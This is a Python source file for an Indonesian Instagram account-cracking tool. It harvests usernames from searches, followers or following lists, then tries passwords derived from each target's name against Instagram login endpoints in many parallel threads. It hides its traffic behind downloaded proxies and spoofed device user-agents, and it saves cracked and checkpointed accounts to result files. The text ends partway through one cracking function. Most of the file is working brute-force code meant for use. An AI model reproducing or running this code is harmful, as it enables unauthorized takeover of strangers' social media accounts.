import os,sys,requests,re
# coding:utf-8
#/usr/bin/python
try:
	import json
	import uuid
	import hmac
	import random
	import hashlib
	import urllib
	import urllib.request
	import urllib.parse
	import base64
except ImportError as e:
	exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
import requests,json,os,sys,random,datetime,time,re,binascii,base64,struct
try:
    import Cryptodome
except ImportError:
    os.system('clear')
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall Cryptodome\n")
    os.system("pip install pycryptodome");os.system("pip install pycryptodomex")
try:
    import nacl.public
except ImportError:
    os.system('clear')
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall PyNaCl\n")
    os.system("pkg install binutils -y");os.system("pip install PyNaCl")
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from time import time as tim
from cleantext import clean
from rich import print as prints
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel
from rich.table import Table as me
from rich.console import Console as sol
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import time
from rich.progress import Progress,TextColumn
from Cryptodome.Cipher import AES, PKCS1_v1_5
from Cryptodome.PublicKey import RSA
from Cryptodome.Random import get_random_bytes
from nacl.public import PublicKey, SealedBox
from Cryptodome.PublicKey import RSA
from Cryptodome import Random
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
menudump=[]
merah  = '[#FF0022]'
hijau  = '[#00FF33]'
hapus  = '[/]'
bc = '[bold cyan]'
kuning = '[#FFFF00]'
kn = '[bold yellow]'
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
color_table = "#afafff"
color_rich = "[#afafff]"
try:
	os.mkdir('result')
except:
	pass
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
bc = '[bold cyan]'
acakrich=random.choice([Z2,H2,K2,B2,U2,N2,O2,P2,J2,A2])
hapus  = '[/]'

try:
	linkprox = requests.get("https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt").text
	open('.prox.txt','w').write(linkprox)
except:pass
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[96;1m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (Linux; Android 6.0; E5633 Build/30.2.B.1.21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1776; Sony; E5633; E5633; mt6795; uk_UA; 98288242)"
#ugen=open('ua.txt','r').read().splitlines()
internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],["sukses"]
HARIS={}
HARIS1={}
method=[]
s=requests.Session()
zx=[]
s=requests.Session()
ncek=[]
til = "ncek"
############UA#############
hapus  = '[/]'
biru_m = '[bold cyan]'
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Good Morning"
	elif 12 <= hours < 15:timenow = "Good Afternoon"
	elif 15 <= hours < 18:timenow = "Good Evening"
	else:timenow = "Good Night"
	return timenow
def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();sleep(0.03) 
def banner():
	clear()
	au=f"""
[blue] 
\t\t██╗░██████╗░░█████╗░
\t\t██║██╔════╝░██╔══██╗
\t\t██║██║░░██╗░██║░░╚═
\t\t██║██║░░╚██╗██║░░██╗  AUTHOR:NCEK-XD
\t\t██║╚██████╔╝╚█████╔╝  VERSION:2.0.3
\t\t╚═╝░╚═════╝░░╚════╝░
[/blue]"""
	sol().print(nel(au,style='',title=f'{waktu()}'))
def loadinglogin():
    animation = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(50):
        time.sleep(0.1)
        sys.stdout.write(f"\r{N}[{H}•{N}] {H}Sedang Login Harap Tunggu....{N} " + animation[i % len(animation)] +"\x1b[0m ")
        sys.stdout.flush()
    print("")
try:
    urllib_quote_plus = urllib.quote
except:
    urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
    user=open('.username','r').read()
    coki = open('.kukis.log','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':coki},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except FileNotFoundError:
        os.remove('.kukis.log')
        os.remove('.username')
    except  (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()
    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            cetak(nel('[bold cyan]Login menggunakan cookie instagram[/]'))
            coki = input(' [ig] Cookie anda : ')
            try:
                id = re.search('ds_user_id=(\d+)',str(coki)).group(1)
                po = s.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":USN},cookies={"cookie":coki})
                xx = json.loads(po.text)["user"]
                nama = xx["full_name"]
                useri = xx["username"]
                user = open('.username','w').write(useri)
                kuki = open('.kukis.log','w').write(coki)
                loadinglogin()
                prints(Panel(f"        selamat [green]{nama}[/] cookie kamu valid", padding=(0,5), style="bold white", width=70));time.sleep(2);time.sleep(2);exit(f"[{M}!{N}] jalankan ulang perintah nya dengan ketik python run.py")
            except (ValueError,KeyError,json.decoder.JSONDecodeError, KeyError, AttributeError,TypeError,AttributeError):
                print("")
                loadinglogin();time.sleep(4)
                exit(f'{M} [x] Login gagal silahkan cek akun tumbal anda');time.sleep(8)
            except ConnectionAbortedError:
                exit(f'{merah}Tidak ada koneksi internet')
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:register_device()
class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
		self.pwa=[]
	def logo(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			urut=[]
			urut.append(Panel(f"{bc}Nama     : {nama}		\n{bc}Username : {self.username} {hapus}		\nPengikut : {followers} 					\n{bc}{hapus}Mengikuti: {following}		",title=f'{merah}•{kuning}•{hijau}•{hijau} DATA AKUN {hijau}•{kuning}•{merah}•{hapus}',padding=(0,2), style="bold white"))
			Console(width=70,style="bold white").print(Columns(urut),justify="center")
			tap = me()
			tap.add_column('NO', style='blue', justify='center')
			tap.add_column('MENU', style='', justify='left', width=55)
			tap.add_column('STATUS', style='green', justify='right')
			tap.add_row('[01]','Crack Dari Pencarian Nama				 	','[ON]')
			tap.add_row('[02]','Crack Dari Pengikut',					'[ON]')
			tap.add_row('[03]','Crack Dari Mengikuti			',					'[ON]')
			tap.add_row('[04]','Crack Ulang Hasil [yellow]CP[/yellow]					','[ON]')
			tap.add_row('[05]','Lihat Hasil Crack					','[ON]')
			tap.add_row('[06]','Bot auto unfollow','[red][OFF][/red]')
			tap.add_row('[E]','[red]LOGOUT[/red]','[ON]')
			sol().print(tap, justify='left')
	def ChangeLog(self):
		io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur yang di update'))
		io='[1] Bot unfollow instagram\n[2] Bot spam komen'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fitur tambahan'))
		io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
		oi = nel(io, style='cyan')
		cetak(nel(oi, title='Fix Bug'))
		exit()
	def Exit(self):
		kel='[?] Apakah anda yakin ingin keluar ?'
		kel1=nel(kel,style='red')
		sol().print(kel1)
		x=input(f'\n{N}[•] Jawaban [y/t] : {C}')
		if x in ('y','Y'):
			os.remove('.kukis.log')
			os.remove('.username')
			os.system('python run.py')
		elif x in ('t','T'):
			os.system('python run.py')
		else:
			self.Exit()
	def sixAPI(self,six_id):
		url = f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={six_id}&rrank_token=0.35875757839675004&include_reel=true"
		x = requests.get(url)
		x_jason = x.json()
		uid = str( x_jason['users'][0].get("user").get("pk") )
		return uid
	def unfollowAPI(self,user_id,username_id,cookie):
		uuid=uuid.uuid4()
		xx=self.s.get(f'https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid={uuid.uuid4()}').cookies['csrftoken']
		s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})
		data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': xx})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			str(uuid.uuid4()),
			urllib.request.quote(data))
		return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text
	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.35875757839675004&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname search {H}{nama}{N}")
					sys.stdout.flush()
					time.sleep(0.0002)
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
		except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				exit(f'\n{M}┣[!] Koneksi internet bermasala;h{C}')
		except (KeyError, UnboundLocalError):
				exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
		except KeyboardInterrupt:
				pass
		return internal
	
	def convert(self, nama):
		with requests.Session() as jembut:
			for i in nama.split(','):
				curl = jembut.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(i), headers = {"user-agent":USN}, cookies =self.cookie).json()
				data = curl["data"]["user"]
				return data["id"]

	def followers(self, userid, cokz):
		with requests.Session() as kontol:
			try:
				link = kontol.get(f"https://i.instagram.com/api/v1/friendships/{userid}/followers/?count=100&max_id={cokz}", headers = {"user-agent":USN}, cookies =self.cookie)
				for x in json.loads(link.text)["users"]:
					if x["username"] in internal:
						continue
					internal.append(x["username"]+"|"+x["full_name"])
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
					sys.stdout.flush()
					time.sleep(0.0002)
				if "next_max_id" in json.loads(link.text):self.followers(userid, json.loads(link.text)["next_max_id"])
				self.passwordAPI(internal)
			except KeyboardInterrupt:
				pass
			except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
				self.passwordAPI(internal)
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)

	def following(self, userid, cokz):
		with requests.Session() as kontol:
			try:
				link = kontol.get(f"https://i.instagram.com/api/v1/friendships/{userid}/following/?count=100&max_id={cokz}", headers = {"user-agent":USN}, cookies =self.cookie)
				for x in json.loads(link.text)["users"]:
					if x["username"] in internal:
						continue
					internal.append(x["username"]+"|"+x["full_name"])
					sys.stdout.write(f"\r{H}•{N} sedang mengumpulkan {H}{len(internal)} {N}useraname")
					sys.stdout.flush()
					time.sleep(0.0002)
				if "next_max_id" in json.loads(link.text):self.following(userid, json.loads(link.text)["next_max_id"])
				self.passwordAPI(internal)
			except KeyboardInterrupt:
				pass
			except KeyError:
				print(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik/ Tumbal anda mati")
				self.passwordAPI(internal)
			except (requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
				print(f'\n{M}┣[!] Koneksi internet bermasalah{C}')
				self.passwordAPI(internal)

	def idAPI(self,cookie,id):
		if 'sukses' in lisensiku:
			try:
				m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit(f"\n{M}┣[!] Koneksi internet bermasalah{C}")
			except (json.decoder.JSONDecodeError, KeyError, AttributeError):
				exit(f"{M}[!] Cookie checkpoint{N}")
			except Exception as e:
				exit(f"{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
			return idx
		else:register_device()
	def ua_baru(self):
		rc=random.choice
		igv=self.vers()
		ua = rc([
		f"Instagram {igv} Android (29/10; 280dpi; 720x1472; motorola; moto e(7); malta; mt6762; in_ID; 486308406)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2218; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 486308487)",
		f"Instagram {igv} Android (29/10; 272dpi; 720x1358; motorola; moto g(7) play; channel; qcom; in_ID; 483850199)",
		f"Instagram {igv} Android (29/10; 420dpi; 1080x2144; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 238dpi; 720x1479; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1528; motorola; moto e22; borag; mt6765; in_ID; 486089352)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1440; motorola; moto g22; hawaiip; mt6765; in_ID; 486308486)",
		f"Instagram {igv} Android (28/9; 280dpi; 720x1418; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850199)",
		f"Instagram {igv} Android (28/9; 306dpi; 720x1410; motorola; moto e(6) plus; pokerp; mt6762; in_ID; 483850154)",
		f"Instagram {igv} Android (29/10; 460dpi; 1080x2069; motorola; moto g(8) plus; doha; qcom; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 480dpi; 1080x2266; motorola; motorola one action; troika_sprout; exynos9610; in_ID; 483850214)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1466; motorola; moto g(20); java; ums512_1h10; in_ID; 483850212)",
		f"Instagram {igv} Android (29/10; 260dpi; 720x1478; motorola; moto g(8) power lite; blackjack; mt6765; in_ID; 483850070)",
		f"Instagram {igv} Android (30/11; 280dpi; 720x1515; motorola; moto g(9) play; guamp; qcom; in_ID; 483850212)",
		f"Instagram {igv} Android (31/12; 280dpi; 720x1472; motorola; moto e22; borag; mt6765; in_ID; 483850086)"])
		return ua
	def ua_ran(self):
		rr = random.randint;rc = random.choice;dpis = random.choice(["240dpi", "480dpi", "320dpi", "440dpi", "640dpi","133dpi","320dpi","515dpi","160dpi","640dpi","240dpi","120dpi","800dpi","480dpi","225dpi","768dpi","216dpi","1024dpi","213dpi","450dpi"]);basa =rc(['en_US','en_GB','id_ID','in_ID','de_DE','ru_RU','en_SG','fr_FR','fa_IR','ja_JP','pt_BR','cs_CZ','zh_HK','zh_CN','vi_VN','en_PH','en_IN','tr_TR','it_IT']);pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688","1080x1920","720x1280","1080x2076","1440x2768","1440x2368"]);akhir = rr(399993134,444761830);com=rc(["qcom","mt6833","mt6765","mt8168"]);ver = rr(18,25);si = rr(72,120);versi=self.vers();andro=rc([f"30/{rr(4,23)}",f"31/{rr(4,13)}",f"29/{rr(4,13)}"]);xiaomi=rc(['M2004J19C','Redmi Note 9S','M2101K7AG','cepheus','Redmi Note 9 Pro','Redmi Note 8 Pro','220333QL','M2101K7BG','M2006C3MG','M2012K11G'])
		mod=rc(['galahad','curtana','sunny','cepheus','joyeuse','begonia','wind','secret','angelica','raphael','vili','taoyao','ginkgo','renoir','haydn'])
		uami=(f"Instagram {versi} Android ({andro}; {dpis}; {pxl}; Xiaomi/Redmi; {xiaomi}; {mod}; {com}; in_ID)")
		return uami
	def vers(self):
		igv=("100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,100.0.0.17.129,79.0.0.21.101,78.0.0.11.104,77.0.0.20.113,76.0.0.15.395,75.0.0.23.99,74.0.0.21.99,73.0.0.22.185,72.0.0.21.98,71.0.0.18.102,70.0.0.22.98,69.0.0.30.95,68.0.0.11.99,67.0.0.25.100,66.0.0.11.101,65.0.0.12.86,64.0.0.14.96,63.0.0.17.94,62.0.0.19.93,61.0.0.19.86,60.1.0.17.79,59.0.0.23.76,58.0.0.12.73,57.0.0.9.80,56.0.0.13.78,55.0.0.12.79,54.0.0.14.82,53.0.0.13.84,52.0.0.8.83,51.0.0.20.85,50.1.0.43.119,49.0.0.15.89,48.0.0.15.98,47.0.0.16.96,46.0.0.15.96,45.0.0.17.93,44.0.0.9.93,43.0.0.10.97,42.0.0.19.95,41.0.0.13.92,40.0.0.14.95,39.0.0.19.93,38.0.0.13.95,37.0.0.21.97,36.0.0.13.91,35.0.0.20.96,34.0.0.12.93,33.0.0.11.92,32.0.0.16.94,31.0.0.10.94,30.0.0.12.95,271.1.0.21.84,131.0.0.23.11,130.0.0.31.12,128.0.0.26.12,126.0.0.25.12,125.0.0.20.12,124.0.0.17.47,123.0.0.21.11,122.0.0.29.23,120.0.0.29.11,119.0.0.33.14,118.0.0.28.12,117.0.0.28.12,115.0.0.26.11,114.0.0.38.12,113.0.0.39.12,112.0.0.29.12,111.1.0.25.15,110.0.0.16.11,109.0.0.18.12,108.0.0.23.11,107.0.0.27.12,106.0.0.24.11,105.0.0.18.11,104.0.0.21.11,103.1.0.15.11,102.0.0.20.11,101.0.0.15.12,100.0.0.17.12,99.0.0.32.182,98.0.0.15.119,97.0.0.32.119")
		igve=igv.split(",")
		versi=random.choice(igve)
		return versi
	def ua_igeh(self):
		rc=random.choice
		igv=self.vers()
		real=rc([ "Infinix F98","Infinix X6816D","Infinix X688B","Infinix X689D","Infinix X662","Infinix X689F","Infinix X675","Infinix X668C"])
		me=rc(["Infinix-F98","Infinix-X6816D","Infinix-X688B","Infinix-X689D","Infinix-X662","Infinix-X689F","Infinix-X675","Infinix-X668C"])
		com="qcom"
		comi="in_ID"
		dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
		pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
		andro=rc(["30/11","31/12","29/10"])
		ua=f"Instagram {igv} Android ({andro}; {dpi}dpi; {pxl}; INFINIX MOBILITY LIMITED/Infinix; {real}; {me}; {com}; in_ID"
		return ua
	def ingfo(self):
		urut = []
		prints(Panel(f"[{bc}!{hapus}] Hasil crack akan di simpan di dalam folder results", padding=(0,2),style=""))
		urut.append(Panel(f"result/[bold green]success-{day}.txt[/]",padding=(0,2),style=""))
		urut.append(Panel(f"result/[bold yellow]checkpoint-{day}.txt[/]",padding=(0,4),style=""))
		self.tol.print(Columns(urut))
	def ifo(self):
		urut = []
		prints(Panel(f"[{bc}+{hapus}] Pilih methode",style=""))
		urut.append(Panel("[01] Methode [bold cyan]API[/]",padding=(0,1),style=""))
		urut.append(Panel("[02] Methode [bold cyan]API V2[/]",padding=(0,1),style=""))
		urut.append(Panel("[03] Methode [bold cyan]AJAX[/]",padding=(0,1),style=""))
		self.tol.print(Columns(urut))
	def passwordAPI(self,xnx):
		idtar=f'[•] TOTAL ID  : [cyan]{len(internal)} [/cyan]'
		idtar1=nel(idtar,style='')
		sol().print(idtar1)
		self.ifo()
		u = input('  [?] Pilih methode : ')
		if u in ["1","01"]:
			method.append('satu')
		elif u in ["2","02"]:
			method.append('dua')
		elif u in ["3","03"]:
			method.append('tiga')
		else:
			method.append('satu')
		komb='[1] Name,Name123,Name1234\n[2] Name,Name123,Name1234,Name12345\n[3] Name,Name123,Name1234,Name12345,Name123456\n[4] Name,Name123,Name1234 + Password Manual'
		sol().print(nel(komb,title='[cyan]List Password[/cyan]'))
		c=input(f' {N}[•] Masukan Pilihan :{C} ')
		if c in ["01","1"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		elif c in ["4","04"]:
			prints(Panel(f"{P2}contoh password : sayang,anjing,bangsat",width=80,padding=(0,4),style=""))
			zx=input(f'{N}[•] Tambahkan password :{N} ')
			zz = zx.split(",")
			for i in zz:
				self.pwa.append(i)
			self.generateAPI(xnx,c,zx)		
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,zx=''):
		self.ingfo()
		global prog,des
		prog = Progress(TextColumn('{task.description}'))
		des = prog.add_task('',total=len(user))
		with prog:
			with ThreadPoolExecutor(max_workers=40) as shinkai:
				for i in user:
					try:
						username=i.split("|")[0]
						password=clean(text=i.split("|")[1].lower(),no_emoji=True)
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234',password.lower()]
									else:
										sandi=[w+'123',w,w+'1234',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',w+'1234567',w+'12345678',w+'123456789',password.lower()]
								elif o=="4":
									for kontol in self.pwa:
										sandi=[w,w+'123',w+'1234']
										sandi.append(kontol)
								sandi.append(username.replace(".", "").replace("_", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("__", ""))
								sandi.append(username.replace(".", "").replace("_", "").replace("@", ""))
								sandi.append(w.replace(" ", ""))
								if 'satu' in method:
									shinkai.submit(self.crackAPI,username,sandi)
								elif 'dua' in method:
									shinkai.submit(self.crackAPI2,username,sandi)
								elif 'tiga' in method:
									shinkai.submit(self.ajax,username,sandi)
								else:
									shinkai.submit(self.crackAPI,username,sandi)
					except:
						continue
			print('\n')
			shinkai.submit(self.crackAPI,username,sandi)
			exit(f'[✓] crack akun selesai ngab, OK- {H}{len(success)}{N} CP- {K}{len(checkpoint)}{N}')
	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":"936619743392459"})
			x_jason=x.json()["data"]["user"]
			nama=x_jason["full_name"]
			pengikut=x_jason["edge_followed_by"]["count"]
			mengikut=x_jason["edge_follow"]["count"]
			postingan=x_jason["edge_owner_to_timeline_media"]["count"]
		except:
			nama = "-"
			pengikut = "-"
			mengikut = "-"
			postingan = "-"
		return nama,pengikut,mengikut,postingan
	def encpwd(self,password):
		resp = ses.get("https://instagram.com/api/v1/web/accounts/login/ajax/")
		key_id = int(resp.headers.get("ig-set-password-encryption-web-key-id"))
		pub_key = resp.headers.get("ig-set-password-encryption-web-pub-key")
		version =resp.headers.get("ig-set-password-encryption-web-key-version")
		key = Random.get_random_bytes(32)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(
            password.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1,
                           key_id,
                           *list(struct.pack('<h', len(encrypted_key))),
                           *list(encrypted_key),
                           *list(cipher_tag),
                           *list(encrypted_password)])
		encrypted = base64.b64encode(encrypted).decode('utf-8')
		return f'#PWD_INSTAGRAM_BROWSER:{version}:{time}:{encrypted}'
	
	def enc_pw(self, pw, link):
		key_id = re.findall('{"key_id":"(.*?)"', str(link.replace("\\","")))[0]
		pub_key = re.findall('public_key\":\"(.*?)\",', str(link.replace("\\","")))[0]
		version = re.findall('version\":\"(\d+)\"}', str(link.replace("\\","")))[0]
		key = Random.get_random_bytes(32)
		iv = bytes([0] * 12)
		time = int(datetime.now().timestamp())
		aes = AES.new(key, AES.MODE_GCM, nonce=iv, mac_len=16)
		aes.update(str(time).encode('utf-8'))
		encrypted_password, cipher_tag = aes.encrypt_and_digest(pw.encode('utf-8'))
		pub_key_bytes = binascii.unhexlify(pub_key)
		seal_box = SealedBox(PublicKey(pub_key_bytes))
		encrypted_key = seal_box.encrypt(key)
		encrypted = bytes([1, int(key_id), *list(struct.pack('<h', len(encrypted_key))), *list(encrypted_key), *list(cipher_tag), *list(encrypted_password)])
		base = base64.b64encode(encrypted).decode('utf-8')
		return f"#PWD_INSTAGRAM_BROWSER:{version}:{time}:{base}"
	
	def crackAPI2(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		rr=random.randint;rc=random.choice
		logtemp=0
		if logtemp > 10:logtemp=0
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
			try:
				link = ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbikEBmNhMsxlnCabkCq5bjspvbWU6_UCk0FCzhKplDHJnyXJFzjeLj1NoF95wRUvkfZ4TL3w5nB3KonV8Gu7eeenGJLOpZ0DT9lZfD2336OptE_6iHBRa_R&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Faccounts%252F")
				data = {"jazoest": str(rr(11111,55555)),"phone_id": str(uuid.uuid4()),"_csrftoken": ses.cookies["csrftoken"],"enc_password": self.enc_pw(pw, link.text),"username": user,"adid": str(uuid.uuid4()),"guid": str(uuid.uuid4()),"device_id": "android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]),"google_tokens":"[]","login_attempt_count": logtemp}
				kode = hmac.new("a86109795736d73c9a94172cd9b736917d7d94ca61c9101164894b3f0d43bef4".encode('utf-8'), str(json.dumps(data)).encode('utf=8'),hashlib.sha256).hexdigest()
				date = f'signed_body={kode}.%7B%22jazoest%22%3A%22{data["jazoest"]}%22%2C%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{ses.cookies["csrftoken"]}%22%2C%22enc_password%22%3A%22%23PWD_INSTAGRAM{urllib.parse.quote(data["enc_password"].encode("utf8")).split("SER")[1]}%22%2C%22username%22%3A%22{user}%22%2C%22adid%22%3A%22{str(uuid.uuid4())}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{"android-%s"%(hashlib.sha256(str(time.time()).encode()).hexdigest()[:16])}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%22{logtemp}%22%7D'
